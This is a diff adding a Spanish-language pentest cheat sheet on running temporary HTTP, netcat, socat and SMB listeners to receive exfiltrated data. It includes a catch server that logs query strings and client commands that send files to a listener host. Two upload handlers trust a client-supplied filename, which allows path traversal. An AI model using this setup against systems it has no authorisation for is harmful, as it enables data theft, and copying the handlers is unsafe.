@@ -1,0 +1,230 @@
+# HTTP Catch - Servidores Temporales
+
+Configurar servidores HTTP para recibir archivos exfiltrados o transferencias.
+
+## Python HTTP Server
+
+### Servidor básico
+
+```bash
+# Python 3
+python3 -m http.server 8000
+
+# Directorio específico
+python3 -m http.server 8000 --directory /tmp/share
+
+# Bind específico
+python3 -m http.server 8000 --bind 192.168.1.100
+```
+
+### Servidor con upload
+
+```python
+#!/usr/bin/env python3
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import os
+
+UPLOAD_DIR = '/tmp/uploads'
+
+class UploadHandler(BaseHTTPRequestHandler):
+    def do_POST(self):
+        length = int(self.headers['Content-Length'])
+        data = self.rfile.read(length)
+        
+        filename = self.headers.get('X-Filename', 'uploaded_file')
+        filepath = os.path.join(UPLOAD_DIR, filename)
+        
+        with open(filepath, 'wb') as f:
+            f.write(data)
+        
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b'Upload successful')
+
+os.makedirs(UPLOAD_DIR, exist_ok=True)
+HTTPServer(('0.0.0.0', 8000), UploadHandler).serve_forever()
+```
+
+## PHP Server
+
+### Servidor nativo
+
+```bash
+php -S 0.0.0.0:8000
+```
+
+### Con upload
+
+```php
+<?php
+// upload.php
+if ($_FILES['file']) {
+    $target = '/tmp/uploads/' . basename($_FILES['file']['name']);
+    move_uploaded_file($_FILES['file']['tmp_name'], $target);
+    echo "Uploaded to: $target";
+}
+?>
+
+<!-- index.html -->
+<form enctype="multipart/form-data" method="POST">
+    <input type="file" name="file">
+    <button>Upload</button>
+</form>
+```
+
+## Ruby HTTP Server
+
+```bash
+# Servidor básico
+ruby -run -ehttpd . -p8000
+
+# Con bind específico
+ruby -run -ehttpd /tmp/share -p8000 -b 192.168.1.100
+```
+
+## Node.js Server
+
+### Servidor simple con express
+
+```javascript
+const express = require('express');
+const multer = require('multer');
+const app = express();
+
+const upload = multer({ dest: '/tmp/uploads/' });
+
+app.post('/upload', upload.single('file'), (req, res) => {
+    res.json({ message: 'File uploaded', file: req.file });
+});
+
+app.listen(8000, '0.0.0.0');
+```
+
+### Servidor sin dependencias
+
+```javascript
+const http = require('http');
+const fs = require('fs');
+
+const server = http.createServer((req, res) => {
+    if (req.method === 'POST') {
+        let data = [];
+        req.on('data', chunk => data.push(chunk));
+        req.on('end', () => {
+            const filename = req.headers['x-filename'] || 'upload.bin';
+            fs.writeFileSync('/tmp/uploads/' + filename, Buffer.concat(data));
+            res.end('OK');
+        });
+    }
+});
+
+server.listen(8000);
+```
+
+## Netcat como receptor
+
+```bash
+# Recibir archivo
+nc -l -p 8000 > received_file
+
+# Con timeout
+nc -l -p 8000 -w 60 > received_file
+
+# Múltiples conexiones
+while true; do nc -l -p 8000 > received_$(date +%s); done
+```
+
+## socat para transferencias
+
+```bash
+# Servidor de archivos
+socat TCP-LISTEN:8000,reuseaddr,fork OPEN:file.txt,rdonly
+
+# Receptor de archivos
+socat TCP-LISTEN:8000,reuseaddr,fork OPEN:received.txt,creat,append
+
+# Cliente envía
+socat TCP:192.168.1.100:8000 OPEN:file.txt,rdonly
+```
+
+## Impacket smbserver.py
+
+### Compartir archivos vía SMB
+
+```bash
+# Servidor SMB anónimo
+impacket-smbserver share /tmp/share
+
+# Con autenticación
+impacket-smbserver share /tmp/share -user admin -password secret123
+
+# Puerto específico
+impacket-smbserver share /tmp/share -port 4455
+```
+
+### Cliente Windows
+
+```cmd
+:: Conectar
+net use \\192.168.1.100\share
+
+:: Copiar archivo
+copy file.txt \\192.168.1.100\share\
+
+:: Desconectar
+net use \\192.168.1.100\share /delete
+```
+
+## Capturar exfiltración de datos
+
+### Servidor para capturar datos
+
+```python
+#!/usr/bin/env python3
+from http.server import HTTPServer, BaseHTTPRequestHandler
+from datetime import datetime
+
+class CatchHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+        filename = f'/tmp/exfil_{timestamp}.bin'
+        
+        # Guardar path y headers
+        with open(filename + '.meta', 'w') as f:
+            f.write(f'Path: {self.path}\n')
+            for key, value in self.headers.items():
+                f.write(f'{key}: {value}\n')
+        
+        # Guardar query string como datos
+        if '?' in self.path:
+            data = self.path.split('?', 1)[1]
+            with open(filename, 'w') as f:
+                f.write(data)
+        
+        self.send_response(200)
+        self.end_headers()
+
+HTTPServer(('0.0.0.0', 80), CatchHandler).serve_forever()
+```
+
+### DNS catch
+
+```bash
+# Con dnsmasq
+dnsmasq --no-daemon --log-queries --log-facility=/tmp/dns.log
+
+# Con tcpdump
+tcpdump -i eth0 port 53 -w dns_capture.pcap
+```
+
+## Resumen
+
+| Herramienta | Puerto | Ventaja |
+|-------------|--------|---------|
+| Python | 8000 | Disponible en casi todo Linux |
+| PHP | 8000 | Común en servidores web |
+| Ruby | 8000 | Alternativa rápida |
+| Node.js | 8000 | Alto rendimiento |
+| Netcat | Any | Raw data |
+| socat | Any | Múltiples protocolos |
+| impacket | 445 | SMB nativo Windows |
